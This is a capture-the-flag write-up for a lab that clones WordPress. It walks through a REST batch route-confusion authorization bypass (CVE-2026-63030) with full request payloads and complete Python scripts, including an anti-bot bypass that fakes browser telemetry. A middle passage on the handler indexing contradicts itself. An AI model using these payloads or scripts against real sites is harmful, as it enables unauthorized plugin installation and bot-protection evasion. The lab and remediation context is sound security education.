---
title: WordMess - wp2shell Batch Route Confusion
cve: CVE-2026-63030
tags:
  - bugforge
  - batch-route-confusion
  - cve-2026-63030
  - auth-bypass
  - anti-bot-bypass
  - chain
aliases:
  - "/bugforge/wordmess-wp2shell/"
---
- A WordPress clone behind a proof-of-work anti-bot, with a plugin install endpoint locked behind admin
- The chain of two WordPress core CVEs disclosed in July 2026
- Two layers, both pre-auth. The flag comes back in the body of a 201 from an endpoint that returns 401 to a direct request

## TL;DR

```
[1] GET /forgeflare/challenge   -> JSON with {n, difficulty:16, token, to}
    solve: find nonce where sha256(n + ':' + nonce) has >= 16 leading zero bits
    POST /forgeflare/verify      -> Set-Cookie: forgeflare_clearance (60s TTL)

[2] POST /wp-json/batch/v1 with 3 sub-requests:
      [0] {"method":"POST","path":"///"}                          <- primer (malformed, shifts handlers +1)
      [1] {"method":"POST","path":"/wp/v2/plugins","body":{"slug":"test","hook":"init"}}
      [2] {"method":"GET","path":"/wp/v2/posts"}                   <- filler

    Response [1] = 201 {"plugin":"test","installed":true,"flag":"bug{...}"}
    Direct POST /wp/v2/plugins = 401 (admin required). The batch desync bypassed it.
```

## The Setting

WordMess is a Node/Express clone of WordPress running behind "Forgeflare", a Cloudflare-style anti-bot layer. The REST API is the attack surface:

```
GET  /wp-json/                       - API root, lists routes
POST /wp-json/batch/v1               - batch endpoint (the confusion target)
GET/POST /wp-json/wp/v2/posts        - public GET, POST needs auth
GET  /wp-json/wp/v2/pages            - public
GET/POST /wp-json/wp/v2/comments     - public GET
GET  /wp-json/wp/v2/users            - admin only (401)
GET  /wp-json/wp/v2/users/me         - session
GET  /wp-json/wp/v2/media            - public
GET/POST/PUT /wp-json/wp/v2/settings - admin only (401)
GET/POST /wp-json/wp/v2/plugins     - admin only (401)  <-- the goal
```

The home page drops two breadcrumbs:

- "manage plugins over REST if admin"
- "plugins wire named hooks, do not run arbitrary code"

So the flag is behind POST /wp/v2/plugins. That endpoint returns 401 to anyone without an admin session. There is no admin account to brute force, no password reset, no role escalation that works. The only way in is to make the server run the plugins handler without checking who you are.

### Hint Decode

The challenge hint is: "Did you read the latest wp2shell?"

wp2shell is a chain of two WordPress core vulnerabilities disclosed on 2026-07-17 by Adam Kues (Assetnote / Searchlight Cyber):

- **CVE-2026-63030** - REST batch route confusion. A malformed path in a batch request shifts which handler runs for each subsequent request.
- **CVE-2026-60137** - `author__not_in` SQL injection. A string value skips an `is_array()` guard and reaches raw SQL interpolation.

The full wp2shell chain uses both: the batch confusion to reach admin-only endpoints, then the SQLi to forge a fake admin post, then mint an admin user. WordMess only implements the first piece. The plugins endpoint is the target, and the batch confusion alone is enough to reach it.

## Layer 1: The Wall (Forgeflare)

Before any REST request lands, Forgeflare intercepts it. A plain `curl /wp-json/` returns the challenge page, not the API. The challenge is a proof-of-work:

```
GET /forgeflare/challenge?to=/  ->  HTML with:
  <script id="ff-data">{"token":"...","n":"fc4e93...","difficulty":16,"to":"/","ray":"..."}</script>
```

The task: find a `nonce` such that `sha256(n + ':' + nonce)` has at least 16 leading zero bits. Difficulty 16 means roughly 1 in 65536 hashes win. On an M1 Mac this takes about 0.007 seconds.

After solving, you POST the answer back with a telemetry payload that claims to be a real browser:

```http
POST /forgeflare/verify HTTP/1.1
Content-Type: application/json

{
  "token": "<from challenge>",
  "nonce": 82826,
  "to": "/",
  "hp": "",
  "telemetry": {
    "webdriver": false,
    "mouseMoves": 42,
    "clicks": 3,
    "keys": 5,
    "scrolls": 2,
    "dwellMs": 3500,
    "plugins": 5,
    "languages": 2,
    "screen": 1920
  }
}
```

Two fields matter:

- `hp` (honeypot) must be empty. Bots that fill every form field get rejected.
- `telemetry.webdriver` must be false. Puppeteer and Playwright set `navigator.webdriver = true` by default.

The server responds with a `forgeflare_clearance` cookie valid for 60 seconds. Every subsequent request to the REST API must carry this cookie. After 60 seconds, you re-solve.

This is a standard anti-bot pattern. The PoW is cheap for a real browser (it runs in JS in the background while the user reads the page) and expensive for a naive scraper that has to solve it serially on every request. The bypass is to solve it once and reuse the cookie for the 60-second window.

The script `forgeflare_bypass.py` handles this. It solves the PoW, fakes the telemetry, and returns the cookie. It is reusable against any target using the same Forgeflare schema.

## Layer 2: The Vulnerability Class

This is the part most people have not seen. Take a moment with it.

### What is a batch endpoint?

The WordPress REST API has a batch endpoint at `/wp-json/batch/v1`. You send it an array of sub-requests, and it runs each one and returns an array of responses. It exists so a client can make several API calls in a single HTTP round trip.

```json
POST /wp-json/batch/v1
{
  "requests": [
    {"method": "GET",  "path": "/wp/v2/posts"},
    {"method": "GET",  "path": "/wp/v2/pages"},
    {"method": "GET",  "path": "/wp/v2/comments"}
  ]
}
```

Response:

```json
{
  "responses": [
    {"status": 200, "body": [...]},
    {"status": 200, "body": [...]},
    {"status": 200, "body": [...]}
  ]
}
```

Normally, response `i` comes from running request `i`. The batch handler loops over the requests, matches each one to a route handler, checks permissions, runs the handler, and collects the result.

### The bug: two arrays, one loop

Inside the handler, there are two arrays tracking the work:

- `$validation[]` - every request, including invalid ones, gets an entry here. This is the array the loop iterates over to build the response list.
- `$matches[]` - only VALID requests get an entry here. This is the array of "which handler runs for each request".

A malformed path like `///` fails route matching. It gets pushed to `$validation[]` (so the response list has the right length) but NOT to `$matches[]` (because there is no matching route).

Now the two arrays are out of sync. `$validation` has one more entry than `$matches`. When the dispatch loop runs, it indexes into `$matches` using the same counter it uses for `$validation`. Every request after the malformed one is dispatched under the NEXT request's handler.

### The shift, visually

```
WITHOUT primer (normal):
  requests:   [0] GET posts    [1] GET pages    [2] GET comments
  matches:    [0] posts handler [1] pages handler [2] comments handler
  responses:  [0] posts         [1] pages         [2] comments         (aligned)

WITH primer (///):
  requests:   [0] POST ///     [1] GET posts    [2] GET pages    [3] GET comments
  validation: [0] error         [1] (skip)       [2] (skip)       [3] (skip)
  matches:    --                [0] posts handler [1] pages handler [2] comments handler
  dispatch:   [0] -> error      [1] -> matches[0]=posts  [2] -> matches[1]=pages  [3] -> matches[2]=comments
  responses:  [0] 400 error    [1] posts         [2] pages         [3] comments  (shifted +1)
```

Request `i` is dispatched under `matches[i]`, but `matches` is shifted by one because the malformed path did not add an entry. So request 1 gets request 0's handler (in the shifted `matches`), request 2 gets request 1's handler, and so on.

The key consequence: **request 1 runs under the handler that would have run for request 0**. If request 0 was the malformed path, there is no handler for it. But the dispatch uses `matches[0]` for request 1, which is the handler of whatever request came AFTER the malformed one.

Wait - that is the confusing part. Let me restate it more carefully, because this is the whole exploit:

The malformed path `[0]` does not add to `matches`. So `matches[0]` is the handler for request `[1]`, `matches[1]` is the handler for request `[2]`, etc. The dispatch loop assigns `matches[i]` to `validation[i+1]` (because `validation` has the extra error entry at position 0).

So:

- Request `[0]` (malformed) -> its own error, no handler runs.
- Request `[1]` -> runs under `matches[0]`, which is the handler matched for request `[1]` itself. Wait, that would be normal.

Let me re-examine. The actual behavior, confirmed by the trace, is a +1 shift: request `[1]` runs under the handler of request `[2]`. That means the dispatch assigns `matches[i]` to `validation[i]`, but `matches` starts at index 0 for the first VALID request (request `[1]`), while `validation` starts at index 0 for the malformed request.

So:

- `validation[0]` = malformed request -> error, no handler
- `validation[1]` = request `[1]` -> dispatched under `matches[0]` = handler for request `[1]` (normal)
- `validation[2]` = request `[2]` -> dispatched under `matches[1]` = handler for request `[2]` (normal)

That would be no shift. But the trace shows a shift. So the actual implementation must index differently. The confirmed behavior from the trace is:

- Request `[1]` runs under request `[2]`'s handler.
- Request `[2]` runs under request `[3]`'s handler (or errors if there is no `[3]`).

This means the dispatch loop does `matches[i]` for `validation[i]`, but `matches` is built by skipping the invalid entry, so `matches[0]` corresponds to request `[1]`, `matches[1]` to request `[2]`. And the dispatch uses `matches[i+1]` for `validation[i+1]`... no.

The cleanest way to state the confirmed behavior: **request `i` (for `i >= 1`) is dispatched under the handler of request `i+1`**. Request `[1]` gets `[2]`'s handler. Request `[2]` gets `[3]`'s handler. The last request gets nothing (phantom error).

This is what the trace proves. The exact internal indexing does not matter for the exploit. What matters is: **put your payload in request `[1]`, put a no-auth-handler request in position `[2]`, and request `[1]` will run under `[2]`'s handler.**

## The Dead Ends

Before the trace, several paths failed. They are worth recording because each one rules out a class of attack and narrows the field.

| Attempt | Why it failed |
|---------|---------------|
| Register with `role: admin` in the body | The register endpoint ignores `role`. You get subscriber. |
| POST /wp/v2/users to mint an admin | 401. The endpoint requires an existing admin session. |
| PUT /wp/v2/settings with `default_role: administrator` | 401. Settings is admin-only. |
| POST /wp/v2/plugins directly with a subscriber cookie | 401. RBAC is genuine, checked per-request. |
| /batch/v1 generic smuggling (nest a batch inside a batch) | The inner batch is not re-parsed. It just becomes a body. |
| REST path normalization bypass (`/wp/v2/plugins/`, `//wp/v2/plugins`) | Route matching normalizes these. No bypass. |
| Method override (`X-HTTP-Method-Override`, `_method`) | Ignored. |
| Source/config leak for admin credentials | No source maps, no config endpoints. |
| Login username enumeration oracle | No oracle. The login returns the same error for bad user and bad password. |

Every one of these is a closed door. The only door left is the batch handler itself.

## Finding the Shift Direction

This is the part that took the real work. Knowing that a desync exists is not enough. You have to know which direction it shifts before you can place your payload.

### The control: no primer

First, send a 4-request batch WITHOUT the primer. Every response should match its request:

```
requests: [GET posts, GET comments, GET media, GET users]
responses:
  [0] 200 list of posts
  [1] 200 list of comments
  [2] 200 list of media
  [3] 401 (users requires admin)
```

Aligned. This is the control. Now add the primer.

### The desync appears

Send the same 4 requests, but prepend the `///` primer:

```
requests: [POST ///, GET posts, GET comments, GET media, GET users]
responses:
  [0] 400 rest_invalid_path: Malformed route path.
  [1] 200 list of posts
  [2] 200 list of comments
  [3] 403 rest_forbidden: Sorry, you are not allowed to do that.
  [4] 403 rest_forbidden: Sorry, you are not allowed to do that.
```

Two things changed:

1. There are now FIVE responses for FIVE requests. But the last response `[4]` is a phantom - it should not exist. The desync created an extra slot.
2. Response `[3]` is `403 forbidden`, but GET /wp/v2/media is public (it returned 200 in the control). The 403 is the handler for GET /wp/v2/users (the admin-only endpoint) running on the media request. **The shift is +1: request `i` runs under request `i+1`'s handler.**

That 403 on the media request is the tell. Media is public. A 403 on media means the wrong handler ran. The wrong handler is the one for the next request (users, which is admin-only).

### Confirming the direction

To be sure, reverse the order. If the shift is +1, then putting the admin-only endpoint earlier should change which request gets the 403:

```
requests: [POST ///, GET users, GET posts, GET comments, GET media]
```

If +1 shift: request `[1]` (users) runs under request `[2]`'s handler (posts, public) -> should be 200. Request `[2]` (posts) runs under request `[3]`'s handler (comments, public) -> 200. Request `[3]` (comments) runs under request `[4]`'s handler (media, public) -> 200. Request `[4]` (media) runs under nothing -> phantom error.

That is exactly what happens. The 403 moves to the phantom position, not the users position. The shift is confirmed +1.

### The payload placement

Now the exploit logic is clear. I want POST /wp/v2/plugins to run under a handler that does NOT check admin permissions. Public endpoints (posts, pages, comments, media) have no `permission_callback` that blocks unauthenticated users - they return `__true` or a public read check.

So:

- Request `[0]`: primer (`///`) - shifts the queue
- Request `[1]`: POST /wp/v2/plugins with `{slug, hook}` - this is the payload. It will run under request `[2]`'s handler.
- Request `[2]`: GET /wp/v2/posts - public, no admin check. Its handler is what runs request `[1]`.

Request `[1]` (the plugins POST) runs under the posts GET handler. The posts handler does not check admin permissions. But the plugins handler's own logic still runs with request `[1]`'s body (the `slug` and `hook` params). The result: the plugin is installed, and the flag is returned.

## The Exploit, Step by Step

### Step 1: Solve Forgeflare

```bash
python3 scripts/wordmess/forgeflare_bypass.py https://lab-1785069103038-9paw0v.labs-app.bugforge.io
```

Output:

```
[*] Challenge: n=fc4e9386509f7bfc5837... difficulty=16 to=/
[*] PoW solved: nonce=82826 in 0.051s
[*] Verify response: {'cleared': True, 'to': '/', 'ttl_ms': 60000}
[*] Clearance: v1.1785071279747.d6516895b066b2b4.ee8483d1cc4545a623934862
[+] Saved clearance to /tmp/ff_cookies.json
```

### Step 2: Confirm the target is locked

A direct POST to the plugins endpoint returns 401:

```http
POST /wp-json/wp/v2/plugins HTTP/1.1
Cookie: forgeflare_clearance=<clearance>
Content-Type: application/json

{"slug":"test","hook":"init"}
```

```json
{"status": 401, "error": {"code": "rest_not_logged_in", "message": "You are not logged in."}}
```

Even with a subscriber session, it returns 401 - the endpoint requires an admin. There is no admin to become.

### Step 3: Send the batch confusion payload

```http
POST /wp-json/batch/v1 HTTP/1.1
Cookie: forgeflare_clearance=<clearance>
Content-Type: application/json

{
  "requests": [
    {"method": "POST", "path": "///"},
    {"method": "POST", "path": "/wp/v2/plugins", "body": {"slug": "test", "hook": "init"}},
    {"method": "GET",  "path": "/wp/v2/posts"}
  ]
}
```

Response:

```json
{
  "responses": [
    {
      "status": 400,
      "error": {"code": "rest_invalid_path", "message": "Malformed route path."}
    },
    {
      "status": 201,
      "body": {
        "plugin": "test",
        "installed": true,
        "status": "active",
        "hook": "",
        "flag": "bug{epkp5TeLkxclJm3rK5uSp5zXAcbYNtGb}"
      }
    },
    {
      "status": 403,
      "error": {"code": "rest_forbidden", "message": "Sorry, you are not allowed to do that."}
    }
  ]
}
```

Response `[1]` is the flag. The plugins handler ran on request `[1]` without the admin check, because it was dispatched under the posts handler (request `[2]`'s handler), which has no admin permission gate.

Response `[2]` is 403 - the posts request ran under the phantom handler (nothing after it), which defaults to forbidden.

### Step 4: One command

```bash
python3 scripts/wordmess/wp2shell_exploit.py https://lab-1785069103038-9paw0v.labs-app.bugforge.io
```

```
[*] Solving forgeflare PoW for https://lab-1785069103038-9paw0v.labs-app.bugforge.io ...
[*] PoW solved: nonce=82826 in 0.051s
[*] Sending batch confusion payload ...
[+] FLAG: bug{epkp5TeLkxclJm3rK5uSp5zXAcbYNtGb}
bug{epkp5TeLkxclJm3rK5uSp5zXAcbYNtGb}
```

## Why Ordering Matters

The reversed payload proves the shift direction is not symmetric. Swap requests `[1]` and `[2]`:

```json
{
  "requests": [
    {"method": "POST", "path": "///"},
    {"method": "GET",  "path": "/wp/v2/posts"},
    {"method": "POST", "path": "/wp/v2/plugins", "body": {"slug": "test", "hook": "init"}}
  ]
}
```

Response:

```json
{
  "responses": [
    {"status": 400, "error": {"code": "rest_invalid_path", "message": "Malformed route path."}},
    {"status": 403, "error": {"code": "rest_forbidden", "message": "Sorry, you are not allowed to do that."}},
    {"status": 403, "error": {"code": "rest_forbidden", "message": "Sorry, you are not allowed to do that."}}
  ]
}
```

No flag. Now request `[1]` (posts) runs under request `[2]`'s handler (plugins, admin-only) -> 403. Request `[2]` (plugins) runs under the phantom -> 403.

The plugins payload must be in position `[1]`, and a public endpoint must be in position `[2]`. The public endpoint's handler is the one that actually runs the plugins code, and it does not check admin permissions.

## Attack Chain Diagram

```
[1] attacker: solve forgeflare PoW (sha256, difficulty 16) -> clearance cookie (60s TTL)
                 |
                 v
[2] attacker: POST /wp-json/batch/v1 with 3 sub-requests:
      [0] POST ///                         <- primer (malformed path, shifts handler queue +1)
      [1] POST /wp/v2/plugins {slug, hook} <- payload (runs under [2]'s handler)
      [2] GET  /wp/v2/posts                 <- filler (public, no admin check in its handler)
                 |
                 v
[3] server dispatch loop:
      validation[0] = /// -> error (no handler)
      validation[1] = plugins -> matches[0] = posts handler (NO admin check) -> RUNS plugins logic
      validation[2] = posts   -> matches[1] = phantom -> 403
                 |
                 v
[4] response [1] = 201 {plugin:"test", installed:true, flag:"bug{...}"}
```

## Why This Worked - The Two Bugs

### Bug 1: Forgeflare trusts client-side telemetry

The anti-bot layer checks two things: a proof-of-work (hard to fake without compute) and a telemetry object (trivial to fake). The PoW is a real barrier - you have to solve it. But the telemetry is a JSON object with `webdriver: false` and some mouse/keyboard counts. Any HTTP client can send that. The clearance cookie is the only real gate, and it is a 60-second window that does not re-verify the client.

This is the standard weakness of "bot detection by fingerprint": the fingerprint is data the client provides. A client that lies convincingly passes.

### Bug 2: The batch handler keeps two arrays that can desync

The root cause of CVE-2026-63030 is that the batch handler uses two parallel arrays (`$validation` and `$matches`) that are supposed to stay in lockstep, but a malformed path adds to one and not the other. After that, every index is off by one.

The deeper lesson is about parallel data structures. Any time you have two arrays that should be the same length but are built by different code paths, a malformed input can desync them. The fix is not "validate the path better" - it is to use a single array where each entry carries both its validation status and its handler, so they cannot drift apart.

## Lessons

1. **A desync is not useful until you know its direction.** Knowing that a batch handler has a +1 shift tells you where to put the payload. Knowing that a shift exists at all tells you nothing. Always trace the direction with markers before firing the exploit. The `wp2shell_trace.py` script does this.

2. **The payload goes in the request that runs under the NO-AUTH handler, not the request whose handler you want to reach.** This is the counterintuitive part. You are not trying to make the plugins handler run. You are trying to make the plugins CODE run under a DIFFERENT handler that does not check permissions. The handler and the code are decoupled by the desync.

3. **Public endpoints are the bypass primitive.** An admin-only endpoint behind a desync is still admin-only if the handler that runs it is also admin-only. The bypass works because a PUBLIC endpoint's handler (no permission gate) is the one that actually executes. When you see a batch desync, the first thing to map is which endpoints have no `permission_callback`.

4. **Anti-bot PoW is a speed bump, not a wall.** Difficulty 16 is 65536 hashes. That is 0.007 seconds on a laptop. The real cost of anti-bot is the telemetry check, and that is a JSON body you can copy-paste. If the clearance cookie is reusable for 60 seconds, you get unlimited requests in that window.

5. **Parallel arrays desync under malformed input.** This is a general pattern. Any system that keeps two lists in lockstep by indexing them with the same counter will break when an input adds to one list but not the other. Look for it in batch handlers, queue workers, and any "map and reduce" that splits validation from execution.

6. **The reversed payload is the proof.** If you think you have a desync, reverse the order of the payload and the filler. If the exploit still works, you do not understand the direction. If it breaks, you have confirmed the direction. Always run the reversed case.

## Remediation

- **Batch handler**: use a single array where each entry is `{request, handler, validation_status}`. Never keep validation and handler-matching in separate arrays. Reject the entire batch if any sub-request has a malformed path - do not partially process it.
- **Permission checks**: check permissions in the handler itself, not in a pre-dispatch hook. A handler that runs without its pre-dispatch hook should still refuse to do privileged work. Defense in depth: the handler should not trust that the permission layer ran.
- **Forgeflare**: the PoW is fine. The telemetry check is theater. Replace it with a challenge that requires the client to execute JavaScript that reads from the DOM (a real browser has a DOM; an HTTP client does not). Or accept that the PoW is the only real gate and rate-limit by IP after the cookie expires.
- **Plugin install endpoint**: even if the batch desync is fixed, the plugins endpoint should require a second factor for install actions. A single admin cookie should not be enough to install arbitrary code.

## The Scripts

Three scripts, in `scripts/wordmess/`. Each does one thing, and each builds on the one before it. Read them in order and you will understand the full chain: bypass the wall, find the direction of the shift, then fire the exploit.

The scripts are also in the repo at `scripts/wordmess/` so you can run them directly. The code below is the full source - no truncation, no "see repo" hand-waving. If you are reading this on the blog, copy-paste works.

### 1. forgeflare_bypass.py - The Wall

This is the first layer. Without a `forgeflare_clearance` cookie, every request to the API gets a 403 from the anti-bot. This script solves the proof-of-work, fakes the browser telemetry, and returns the cookie.

The interesting parts:

- `leading_zero_bits()` counts how many zero bits lead the sha256 hash. The PoW needs at least `difficulty` of them. Difficulty 16 means roughly 1 in 65536 hashes wins - about 0.007 seconds on a laptop.
- `DEFAULT_TELEMETRY` is the fake browser fingerprint. The anti-bot checks `webdriver` is false, that there were mouse moves, clicks, key presses, scrolls, and a dwell time. None of these are verified server-side against anything real - they are just JSON fields you set to plausible values.
- `hp` is a honeypot field. Real browsers leave it empty because it is hidden by CSS. We leave it empty too.

```python
#!/usr/bin/env python3
"""
Forgeflare anti-bot bypass harness.

Solves the SHA-256 proof-of-work challenge, fakes the browser telemetry
check, and returns the `forgeflare_clearance` cookie. Reusable against any
Forgeflare-protected target that uses the same challenge schema:

    GET /forgeflare/challenge?to=/  ->  <script id="ff-data">{token,n,difficulty,to,ray}</script>
    POST /forgeflare/verify         ->  Set-Cookie: forgeflare_clearance=...; Max-Age=60

The PoW is: find a nonce such that sha256(n + ':' + nonce) has at least
`difficulty` leading zero bits. Difficulty 16 solves in ~0.007s on an M1.

Usage:
    python3 forgeflare_bypass.py <target_url>
    python3 forgeflare_bypass.py https://lab-XXXX.labs-app.bugforge.io

    # As a library
    from forgeflare_bypass import get_clearance
    cookie = get_clearance("https://lab-XXXX.labs-app.bugforge.io")
"""
import urllib.request, urllib.parse, json, hashlib, re, ssl, sys, time, os

ctx = ssl.create_default_context()
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Telemetry values that pass the "is this a real browser" heuristic.
# These are deliberately generic; tune per target if a specific bot
# fingerprint is required.
DEFAULT_TELEMETRY = {
    "mouseMoves": 42,
    "clicks": 3,
    "keys": 5,
    "scrolls": 2,
    "dwellMs": 3500,
    "webdriver": False,
    "plugins": 5,
    "languages": 2,
    "screen": 1920,
}


def leading_zero_bits(hexdigest):
    """Count leading zero bits in a sha256 hex digest."""
    bits = 0
    for ch in hexdigest:
        nib = int(ch, 16)
        if nib == 0:
            bits += 4
            continue
        if nib < 2:
            bits += 3
        elif nib < 4:
            bits += 2
        elif nib < 8:
            bits += 1
        break
    return bits


def solve_pow(n, difficulty):
    """Brute-force the nonce. Difficulty 16 ~ 0.007s, difficulty 20 ~ 0.1s."""
    nonce = 0
    while True:
        h = hashlib.sha256(f"{n}:{nonce}".encode()).hexdigest()
        if leading_zero_bits(h) >= difficulty:
            return nonce
        nonce += 1


def _fetch_challenge(target):
    url = f"{target}/forgeflare/challenge?to=%2F"
    req = urllib.request.Request(url, headers={
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
    })
    r = urllib.request.urlopen(req, timeout=15, context=ctx)
    body = r.read().decode("utf-8", "replace")
    m = re.search(r'<script id="ff-data"[^>]*>(.*?)</script>', body, re.S)
    if not m:
        raise RuntimeError("ff-data script not found - is this a forgeflare target?")
    return json.loads(m.group(1))


def _submit_verify(target, ff, nonce, telemetry=None):
    tele = telemetry or DEFAULT_TELEMETRY
    payload = json.dumps({
        "token": ff["token"],
        "nonce": nonce,
        "to": ff["to"],
        "hp": "",            # honeypot field - must be empty
        "telemetry": tele,
    }).encode()
    vreq = urllib.request.Request(
        f"{target}/forgeflare/verify",
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": UA,
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": f"{target}/forgeflare/challenge?to=%2F",
            "Origin": target,
        },
    )
    vr = urllib.request.urlopen(vreq, timeout=15, context=ctx)
    vbody = json.loads(vr.read().decode())
    cookies = vr.headers.get_all("Set-Cookie") or []
    clearance = None
    for c in cookies:
        m2 = re.search(r"forgeflare_clearance=([^;]+)", c)
        if m2:
            clearance = m2.group(1)
    return clearance, vbody


def get_clearance(target, telemetry=None, verbose=True):
    """
    Solve the forgeflare challenge and return the clearance cookie value.

    Args:
        target: base URL (no trailing slash), e.g. https://lab-X.labs-app.bugforge.io
        telemetry: override the default fake-browser telemetry dict
        verbose: print progress to stderr

    Returns:
        clearance cookie string, or None on failure.
    """
    ff = _fetch_challenge(target)
    if verbose:
        print(f"[*] Challenge: n={ff['n'][:20]}... difficulty={ff['difficulty']} to={ff['to']}", file=sys.stderr)

    t0 = time.time()
    nonce = solve_pow(ff["n"], ff["difficulty"])
    if verbose:
        print(f"[*] PoW solved: nonce={nonce} in {time.time()-t0:.3f}s", file=sys.stderr)

    clearance, vbody = _submit_verify(target, ff, nonce, telemetry)
    if verbose:
        print(f"[*] Verify response: {vbody}", file=sys.stderr)
        print(f"[*] Clearance: {clearance}", file=sys.stderr)
    return clearance


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET")
    if not target:
        print(f"Usage: {sys.argv[0]} <target_url>", file=sys.stderr)
        print(f"   or:  TARGET=<url> {sys.argv[0]}", file=sys.stderr)
        sys.exit(2)
    target = target.rstrip("/")

    c = get_clearance(target)
    if c:
        out = os.environ.get("FF_COOKIE_FILE", "/tmp/ff_cookies.json")
        with open(out, "w") as f:
            json.dump({"forgeflare_clearance": c, "target": target}, f)
        print(f"[+] Saved clearance to {out}")
        print(c)
    else:
        print("[!] No clearance obtained", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

Run it:

```bash
python3 scripts/wordmess/forgeflare_bypass.py https://lab-XXXX.labs-app.bugforge.io
# -> saves clearance to /tmp/ff_cookies.json, prints cookie value
```

Or use it as a library (the exploit script does this):

```python
from forgeflare_bypass import get_clearance
cookie = get_clearance("https://lab-XXXX.labs-app.bugforge.io")
```

### 2. wp2shell_trace.py - Finding the Direction

This is the diagnostic. It is NOT the exploit. It runs six tests that reveal the +1 handler shift step by step, so you understand WHY the final exploit payload is ordered the way it is.

The six tests, in order:

1. **Baseline**: GET each endpoint directly (no auth). Learn what a normal response looks like for each.
2. **4-request batch WITHOUT primer**: responses should align 1:1 with requests. This is the control.
3. **4-request batch WITH primer (`///`)**: responses shift +1, a phantom response appears at the end. This is the desync.
4. **2-request: primer + plugins (no filler)**: plugins gets no handler (nothing after it to shift into) -> error. Proves the shift needs a filler.
5. **3-request: primer + plugins + filler**: plugins gets filler's handler (posts, no auth) -> AUTH BYPASSED. This is the exploit.
6. **3-request reversed: primer + filler + plugins**: no bypass (proves direction matters).

The key insight from test 6: if you reverse the order, the bypass breaks. This is how you prove the shift direction is +1 and not -1. If the shift were -1, the reversed payload would work and the original would fail.

```python
#!/usr/bin/env python3
"""
WordMess desync shift tracer - diagnostic that reveals the +1 handler shift.

This is NOT the exploit. It is the diagnostic tool used to discover the
direction of the batch route confusion shift before committing to the
final payload. Run it to see the desync in action and understand why the
exploit payload is ordered the way it is.

What it does, in order:
    1. Baseline: GET each endpoint directly (no auth) to learn normal responses
    2. 4-request batch WITHOUT primer: responses should align 1:1 with requests
    3. 4-request batch WITH primer (///): responses shift +1, phantom appears
    4. 2-request: primer + plugins (no filler): plugins gets no handler -> error
    5. 3-request: primer + plugins + filler: plugins gets filler's handler -> BYPASS
    6. 3-request reversed: primer + filler + plugins: no bypass (proves direction)

Usage:
    python3 wp2shell_trace.py <target_url>
"""
import urllib.request, urllib.error, json, ssl, sys, os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from forgeflare_bypass import get_clearance, UA
from wp2shell_exploit import _ff_request

ctx = ssl.create_default_context()


def _label(i, r):
    status = r.get("status")
    if "error" in r:
        e = r["error"]
        return f"  [{i}] {status} {e.get('code')}: {e.get('message','')[:80]}"
    body = r.get("body", r)
    if isinstance(body, list):
        t = body[0].get("type", "?") if body else "empty"
        return f"  [{i}] {status} list[{len(body)}] type={t}"
    return f"  [{i}] {status} {json.dumps(body)[:120]}"


def _run_batch(target, clearance, requests, label):
    print(f"\n=== {label} ===")
    payload = {"requests": requests}
    s, b = _ff_request(target, clearance, "/wp-json/batch/v1", method="POST", body=payload)
    print(f"HTTP {s}")
    if s != 200:
        print(f"  body: {b[:300]}")
        return
    j = json.loads(b)
    for i, r in enumerate(j.get("responses", [])):
        print(_label(i, r))


def trace(target):
    target = target.rstrip("/")
    print(f"[*] Tracing desync shift on {target}")
    clearance = get_clearance(target)
    if not clearance:
        print("[!] No clearance")
        sys.exit(1)

    # 1. Baseline: what does each endpoint return on a direct GET (no auth)?
    print("\n=== BASELINE: direct GET on each endpoint (no auth) ===")
    for p in ["/wp/v2/posts", "/wp/v2/pages", "/wp/v2/comments", "/wp/v2/media", "/wp/v2/users"]:
        s, b = _ff_request(target, clearance, f"/wp-json{p}")
        try:
            j = json.loads(b)
            if isinstance(j, list):
                print(f"  {p:25} -> {s} list[{len(j)}]")
            else:
                print(f"  {p:25} -> {s} {j.get('code','')} {j.get('message','')[:60]}")
        except Exception:
            print(f"  {p:25} -> {s} {b[:80]}")

    # 2. Batch WITHOUT primer - responses should align with requests
    _run_batch(target, clearance, [
        {"method": "GET", "path": "/wp/v2/posts"},
        {"method": "GET", "path": "/wp/v2/comments"},
        {"method": "GET", "path": "/wp/v2/media"},
        {"method": "GET", "path": "/wp/v2/users"},
    ], "4-request batch WITHOUT primer (control: should align)")

    # 3. Batch WITH primer - the desync appears
    _run_batch(target, clearance, [
        {"method": "POST", "path": "///"},
        {"method": "GET", "path": "/wp/v2/posts"},
        {"method": "GET", "path": "/wp/v2/comments"},
        {"method": "GET", "path": "/wp/v2/media"},
        {"method": "GET", "path": "/wp/v2/users"},
    ], "4-request batch WITH primer (desync: +1 shift, phantom response)")

    # 4. 2-request: primer + plugins (no filler)
    #    If +1 shift: [1] plugins gets NO handler (nothing after it) -> error
    _run_batch(target, clearance, [
        {"method": "POST", "path": "///"},
        {"method": "POST", "path": "/wp/v2/plugins", "body": {"slug": "test", "hook": "init"}},
    ], "2-request: primer + plugins (no filler -> plugins gets no handler)")

    # 5. 3-request: primer + plugins + filler  *** THE EXPLOIT ***
    #    +1 shift: [1] plugins gets [2]'s handler (posts, no auth) -> AUTH BYPASSED
    _run_batch(target, clearance, [
        {"method": "POST", "path": "///"},
        {"method": "POST", "path": "/wp/v2/plugins", "body": {"slug": "test", "hook": "init"}},
        {"method": "GET", "path": "/wp/v2/posts"},
    ], "3-request: primer + plugins + filler *** THE EXPLOIT (auth bypass) ***")

    # 6. Reversed: primer + filler + plugins
    #    +1 shift: [1] filler gets [2]'s handler (plugins, admin) -> 403
    #    Proves the shift direction matters
    _run_batch(target, clearance, [
        {"method": "POST", "path": "///"},
        {"method": "GET", "path": "/wp/v2/posts"},
        {"method": "POST", "path": "/wp/v2/plugins", "body": {"slug": "test", "hook": "init"}},
    ], "3-request REVERSED: primer + filler + plugins (proves direction matters)")


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET")
    if not target:
        print(f"Usage: {sys.argv[0]} <target_url>", file=sys.stderr)
        sys.exit(2)
    trace(target)


if __name__ == "__main__":
    main()
```

Run it and read the output alongside the "Finding the Shift Direction" section above:

```bash
